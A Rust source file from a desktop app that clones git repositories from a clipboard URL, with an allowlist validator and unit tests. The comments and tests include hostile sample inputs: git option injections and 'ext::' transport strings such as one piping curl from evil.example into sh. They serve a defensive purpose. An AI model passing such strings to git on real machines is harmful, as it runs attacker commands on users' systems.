use std::path::{Path, PathBuf};

use gpui::Context;

use super::gallery_actions::{first_path, pick_dir};
use super::Shell;

/// The transports `git clone` may be pointed at.
///
/// A whitelist, and that is the entire point. The previous check — *ends with
/// `.git`, or starts with `git@`, or starts with `http`* — was a shape test, and
/// git accepts strings that pass it and are not addresses at all:
///
/// * `ext::sh -c 'curl … | sh' #.git` ends with `.git`. Git's `ext::` transport
///   treats the rest as a **shell command to run**.
/// * `--template=/tmp/evil.git` also ends with `.git`, and git parses a leading
///   `-` as an option wherever it appears. `--template` copies hooks into the
///   new repository, and clone runs `post-checkout`.
///
/// Both arrive through the clipboard, which is not a trusted channel: the user
/// pressed "Clone from Git", they did not vouch for whatever they last copied.
const ALLOWED_SCHEMES: [&str; 5] = ["https://", "http://", "ssh://", "git://", "file://"];

/// Whether `url` is an address DockCV is willing to hand to `git clone`.
pub(crate) fn looks_like_git_url(url: &str) -> bool {
    // An argument, not an address — checked first, because every other rule
    // below is about the *content* of an address and this one is about git's
    // option parser.
    if url.starts_with('-') || url.is_empty() {
        return false;
    }
    // Whitespace would be one argument to us and several to a transport helper.
    if url.chars().any(char::is_whitespace) {
        return false;
    }

    if let Some(rest) = ALLOWED_SCHEMES
        .iter()
        .find_map(|scheme| url.strip_prefix(scheme))
    {
        return !rest.is_empty();
    }

    // scp-like: `[user@]host:path`. Accepted because it is what GitHub's own
    // "SSH" button copies. The colon must come before any slash, or
    // `https://…` typo'd as `https:/…` would land here.
    if url.contains("://") {
        return false;
    }
    match url.split_once(':') {
        Some((host, path)) => {
            !host.is_empty()
                && !path.is_empty()
                && !host.contains('/')
                // `ext::`, `transport::…` and friends: a second colon straight
                // after the first is a scheme separator, not a host/path one.
                && !path.starts_with(':')
        }
        None => false,
    }
}

/// The directory name to clone into, derived from the URL's last segment.
///
/// Returns `None` rather than a fallback when the segment is not a plain name:
/// `parent.join("..")` walks out of the folder the user picked, and silently
/// cloning somewhere they did not choose is worse than saying no.
pub(crate) fn repo_name(url: &str) -> Option<String> {
    let name = url
        .trim_end_matches('/')
        .rsplit(['/', ':'])
        .next()
        .unwrap_or_default()
        .trim_end_matches(".git");

    let plain = !name.is_empty()
        && name != "."
        && name != ".."
        && !name.contains('/')
        && !name.contains('\\')
        && !name.starts_with('-');
    plain.then(|| name.to_string())
}

pub(crate) fn git_clone(url: &str, parent: &Path) -> Result<PathBuf, String> {
    // Re-checked here rather than trusted from the caller: this function is the
    // one that starts a process, so it is the one that has to be sure.
    if !looks_like_git_url(url) {
        return Err("that doesn't look like a repository address".to_string());
    }
    let name = repo_name(url).ok_or("couldn't work out a folder name from that address")?;
    let dest = parent.join(&name);
    if dest.exists() {
        return Err(format!("“{name}” already exists in that folder"));
    }

    let mut cmd = std::process::Command::new("git");
    cmd
        // No credential helper and no terminal prompt. Without these, a private
        // or mistyped URL leaves `status()` blocked on input that can never
        // arrive — the app is not attached to a terminal — and the Setup screen
        // hangs with no way out. Failing fast is the only honest option, since
        // there is nowhere here to type a password.
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_ASKPASS", "")
        .env("SSH_ASKPASS", "")
        .arg("-c")
        .arg("credential.helper=")
        .arg("clone")
        // Everything after this is an operand. Belt to `looks_like_git_url`'s
        // braces: even if a leading `-` ever gets past the check, git will read
        // it as an address rather than an option.
        .arg("--")
        .arg(url)
        .arg(&dest);
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x08000000);
    }
    let status = cmd
        .status()
        .map_err(|e| format!("could not run git: {e}"))?;
    if !status.success() {
        return Err(format!("git clone failed ({status})"));
    }
    Ok(dest)
}

impl Shell {
    /// Clone a vault from a git URL on the clipboard into a chosen folder.
    pub(crate) fn clone_from_git(&mut self, cx: &mut Context<Self>) {
        let url = cx
            .read_from_clipboard()
            .and_then(|item| item.text())
            .map(|s| s.trim().to_string())
            .filter(|s| looks_like_git_url(s));

        let Some(url) = url else {
            self.setup_error = Some("Copy a git repository URL to the clipboard first.".into());
            cx.notify();
            return;
        };

        self.setup_error = None;
        let receiver = cx.prompt_for_paths(pick_dir());
        let executor = cx.background_executor().clone();
        cx.spawn(async move |this, cx| {
            let Some(parent) = first_path(receiver.await) else {
                return;
            };
            let result = executor
                .spawn(async move { git_clone(&url, &parent) })
                .await;
            let _ = this.update(cx, |this, cx| match result {
                Ok(dir) => this.open_vault(dir, cx),
                Err(message) => {
                    this.setup_error = Some(message);
                    cx.notify();
                }
            });
        })
        .detach();
    }
}

#[cfg(test)]
mod clone_url_tests {
    use super::{looks_like_git_url, repo_name};

    /// The addresses a user actually copies out of GitHub, GitLab and a
    /// self-hosted box. If any of these stopped working the feature would be
    /// dead, so they are pinned first.
    #[test]
    fn ordinary_repository_addresses_are_accepted() {
        for url in [
            "https://github.com/iamzeelex/dockcv.git",
            "https://github.com/iamzeelex/dockcv",
            "http://git.internal.example/cv.git",
            "git@github.com:iamzeelex/dockcv.git",
            "ssh://git@github.com/iamzeelex/dockcv.git",
            "git://git.example.org/cv.git",
            "file:///Users/me/backups/cvault.git",
        ] {
            assert!(looks_like_git_url(url), "should be accepted: {url}");
        }
    }

    /// Each of these passed the old shape test — *ends with `.git`, or starts
    /// with `git@`, or starts with `http`* — and none of them is an address.
    #[test]
    fn strings_that_are_arguments_or_commands_are_refused() {
        for url in [
            // Git parses a leading `-` as an option wherever it appears.
            // `--template` copies hooks in, and clone runs `post-checkout`.
            "--template=/tmp/evil.git",
            "--upload-pack=touch /tmp/pwned",
            "-c core.pager=sh",
            // `ext::` hands the rest to a shell. The `#.git` suffix is there
            // purely to satisfy a check that only looked at the end.
            "ext::sh -c 'curl evil.example|sh' #.git",
            "ext::sh -c whoami",
            // Whitespace splits into several arguments downstream.
            "https://example.com/a b.git",
            // Not an address at all.
            "",
            "just some copied text",
            "https://",
            "host:",
            ":path",
        ] {
            assert!(!looks_like_git_url(url), "should be refused: {url:?}");
        }
    }

    #[test]
    fn the_folder_name_comes_from_the_last_segment() {
        assert_eq!(
            repo_name("https://github.com/iamzeelex/dockcv.git").as_deref(),
            Some("dockcv")
        );
        assert_eq!(
            repo_name("git@github.com:aeinstein/my-cvault").as_deref(),
            Some("my-cvault")
        );
        assert_eq!(repo_name("https://example.com/cv/").as_deref(), Some("cv"));
    }

    /// A name that would climb out of the folder the user picked is refused
    /// rather than replaced with a fallback: cloning somewhere they did not
    /// choose is worse than not cloning.
    #[test]
    fn a_traversing_or_empty_name_is_refused() {
        assert_eq!(repo_name("https://example.com/foo/.."), None);
        assert_eq!(repo_name("https://example.com/foo/."), None);
        assert_eq!(repo_name("file:///"), None);
    }
}
